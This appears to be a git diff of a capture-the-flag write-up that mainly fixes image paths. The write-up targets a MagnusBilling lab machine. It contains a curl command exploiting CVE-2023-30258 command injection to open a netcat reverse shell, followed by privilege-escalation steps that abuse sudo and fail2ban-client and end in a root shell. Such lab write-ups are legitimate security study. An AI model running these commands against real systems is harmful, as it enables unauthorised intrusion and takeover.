@@ -37,14 +37,16 @@ PORT     STATE SERVICE  REASON         VERSION
 
 - `http://10.10.130.88/mbilling/`
 
-![](../../../Image/Pasted%20image%2020250429172223.png)
+![](../../Image/Pasted%20image%2020250429172223.png)
 
 ### ffuf
-![](../../../Image/Pasted%20image%2020250429173716.png)
 
+![](../../Image/Pasted%20image%2020250429173716.png)
 
 - README.md
-![](../../../Image/Pasted%20image%2020250429175638.png)
+
+![](../../Image/Pasted%20image%2020250429175638.png)
+
 - `MagnusBilling version 7.x.x` -> **CVE-2023-30258**
 
 # Privileged Escalation
@@ -54,30 +56,31 @@ PORT     STATE SERVICE  REASON         VERSION
 curl -s 'http://10.10.130.88/mbilling/lib/icepay/icepay.php' --get --data-urlencode 'democ=;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.21.152.228 443 >/tmp/f;'
 ```
 
-![](../../../Image/Pasted%20image%2020250429181109.png)
+![](../../Image/Pasted%20image%2020250429181019.png)
 
-![](../../../Image/Pasted%20image%2020250429181043.png)
+![](../../Image/Pasted%20image%2020250429181043.png)
 
 - Navigation: `/home/magnus`
 
-![](../../../Image/Pasted%20image%2020250429183034.png)
+![](../../Image/Pasted%20image%2020250429183034.png)
 ## root shell
 
 - `sudo -l`
 
-![](../../../Image/Pasted%20image%2020250429181019.png)
+![](../../Image/Pasted%20image%2020250429181109.png)
 
-- `find / -perm -4000 2>/dev/null` -> Find SUID 
+- `find / -perm -4000 2>/dev/null` -> Find SUID
 
-![](../../../Image/Pasted%20image%2020250429201211.png)
+![](../../Image/Pasted%20image%2020250429201211.png)
 ### pkexec
 - `pkexec --version`
 
-![](../../../Image/Pasted%20image%2020250429183208.png)
+![](../../Image/Pasted%20image%2020250429183208.png)
 
 => pkexec version 0.105 -> [Exploiting pkexec Version 0.105 (CVE-2021-4034)](https://www.bing.com/ck/a?!&&p=e2df58a65996d84cd54a94932239873509dd0069cf3df889d3d8e920fe332acaJmltdHM9MTc0NTg4NDgwMA&ptn=3&ver=2&hsh=4&fclid=0bcc7c1f-e4ee-69e1-10b8-6c7fe59168ef&psq=pkexec+version+0.105&u=a1aHR0cHM6Ly9naXRodWIuY29tL2x5NGsvUHduS2l0&ntb=1)
 
-![](../../../Image/Pasted%20image%2020250429182829.png)
+![](../../Image/Pasted%20image%2020250429182829.png)
+
 - I have tried but not succeed.
 
 ### fail2ban
@@ -88,13 +91,13 @@ curl -s 'http://10.10.130.88/mbilling/lib/icepay/icepay.php' --get --data-urlenc
 fail2ban-client --version
 ```
 
-![](../../../Image/Pasted%20image%2020250429200912.png)
+![](../../Image/Pasted%20image%2020250429200912.png)
 
 ```
 systemctl status fail2ban
 ```
 
-![](../../../Image/Pasted%20image%2020250429201840.png)
+![](../../Image/Pasted%20image%2020250429201840.png)
 
 ```
 ps -ef | grep -i "fail2ban"
@@ -127,4 +130,4 @@ sudo fail2ban-client -c /tmp/fail2ban/ -v restart
 
 - `/tmp/bash -p` => access root terminal.
 
-![](../../../Image/Pasted%20image%2020250430221732.png)
+![](../../Image/Pasted%20image%2020250430221732.png)
